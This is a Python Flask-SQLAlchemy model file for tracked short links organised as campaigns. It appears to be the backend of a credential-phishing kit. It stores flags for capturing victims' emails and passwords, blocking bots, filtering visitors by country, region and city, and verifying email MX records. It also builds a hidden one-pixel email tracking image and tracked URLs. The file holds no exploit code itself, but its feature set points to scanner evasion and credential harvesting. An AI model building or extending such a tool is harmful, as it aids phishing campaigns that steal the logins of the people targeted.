from .user import db
import uuid

class Link(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey("user.id"), nullable=False)
    target_url = db.Column(db.String(500), nullable=False)
    short_code = db.Column(db.String(10), unique=True, nullable=False)
    campaign_name = db.Column(db.String(255), default="Untitled Campaign")
    status = db.Column(db.String(50), default="active")  # active, paused, expired
    created_at = db.Column(db.DateTime, default=db.func.current_timestamp())
    total_clicks = db.Column(db.Integer, default=0)
    real_visitors = db.Column(db.Integer, default=0)
    blocked_attempts = db.Column(db.Integer, default=0)
    capture_email = db.Column(db.Boolean, default=False)
    capture_password = db.Column(db.Boolean, default=False)
    bot_blocking_enabled = db.Column(db.Boolean, default=False)
    geo_targeting_enabled = db.Column(db.Boolean, default=False)
    geo_targeting_type = db.Column(db.String(20), default="allow")  # allow or block
    rate_limiting_enabled = db.Column(db.Boolean, default=False)
    dynamic_signature_enabled = db.Column(db.Boolean, default=False)
    mx_verification_enabled = db.Column(db.Boolean, default=False)
    preview_template_url = db.Column(db.String(500), nullable=True)
    allowed_countries = db.Column(db.Text, nullable=True)  # JSON string of country codes
    blocked_countries = db.Column(db.Text, nullable=True)  # JSON string of country codes
    allowed_regions = db.Column(db.Text, nullable=True)    # JSON string of region names
    blocked_regions = db.Column(db.Text, nullable=True)    # JSON string of region names
    allowed_cities = db.Column(db.Text, nullable=True)     # JSON string of city names
    blocked_cities = db.Column(db.Text, nullable=True)     # JSON string of city names

    def __init__(self, user_id, target_url, short_code=None, campaign_name="Untitled Campaign", status="active", capture_email=False, capture_password=False, bot_blocking_enabled=False, geo_targeting_enabled=False, geo_targeting_type="allow", rate_limiting_enabled=False, dynamic_signature_enabled=False, mx_verification_enabled=False, preview_template_url=None, allowed_countries=None, blocked_countries=None, allowed_regions=None, blocked_regions=None, allowed_cities=None, blocked_cities=None):
        self.user_id = user_id
        self.target_url = target_url
        self.short_code = short_code if short_code else self.generate_short_code()
        self.campaign_name = campaign_name
        self.status = status
        self.capture_email = capture_email
        self.capture_password = capture_password
        self.bot_blocking_enabled = bot_blocking_enabled
        self.geo_targeting_enabled = geo_targeting_enabled
        self.geo_targeting_type = geo_targeting_type
        self.rate_limiting_enabled = rate_limiting_enabled
        self.dynamic_signature_enabled = dynamic_signature_enabled
        self.mx_verification_enabled = mx_verification_enabled
        self.preview_template_url = preview_template_url
        self.allowed_countries = allowed_countries
        self.blocked_countries = blocked_countries
        self.allowed_regions = allowed_regions
        self.blocked_regions = blocked_regions
        self.allowed_cities = allowed_cities
        self.blocked_cities = blocked_cities

    def generate_short_code(self):
        return str(uuid.uuid4())[:8]

    def to_dict(self, base_url=""):
        import json
        
        # Generate full URLs with placeholders for unique IDs and email capture
        tracking_url = f"{base_url}/t/{self.short_code}?id={{id}}"
        pixel_url = f"{base_url}/p/{self.short_code}?email={{email}}&id={{id}}"
        email_code = f'<img src="{pixel_url}" width="1" height="1" style="display:none;" />'
        
        return {
            "id": self.id,
            "user_id": self.user_id,
            "target_url": self.target_url,
            "short_code": self.short_code,
            "campaign_name": self.campaign_name,
            "status": self.status,
            "created_at": self.created_at.isoformat() if self.created_at else None,
            "total_clicks": self.total_clicks,
            "real_visitors": self.real_visitors,
            "blocked_attempts": self.blocked_attempts,
            "capture_email": self.capture_email,
            "capture_password": self.capture_password,
            "bot_blocking_enabled": self.bot_blocking_enabled,
            "geo_targeting_enabled": self.geo_targeting_enabled,
            "geo_targeting_type": self.geo_targeting_type,
            "rate_limiting_enabled": self.rate_limiting_enabled,
            "dynamic_signature_enabled": self.dynamic_signature_enabled,
            "mx_verification_enabled": self.mx_verification_enabled,
            "preview_template_url": self.preview_template_url,
            "tracking_url": tracking_url,
            "pixel_url": pixel_url,
            "email_code": email_code,
            "allowed_countries": json.loads(self.allowed_countries) if self.allowed_countries else [],
            "blocked_countries": json.loads(self.blocked_countries) if self.blocked_countries else [],
            "allowed_regions": json.loads(self.allowed_regions) if self.allowed_regions else [],
            "blocked_regions": json.loads(self.blocked_regions) if self.blocked_regions else [],
            "allowed_cities": json.loads(self.allowed_cities) if self.allowed_cities else [],
            "blocked_cities": json.loads(self.blocked_cities) if self.blocked_cities else []
        }


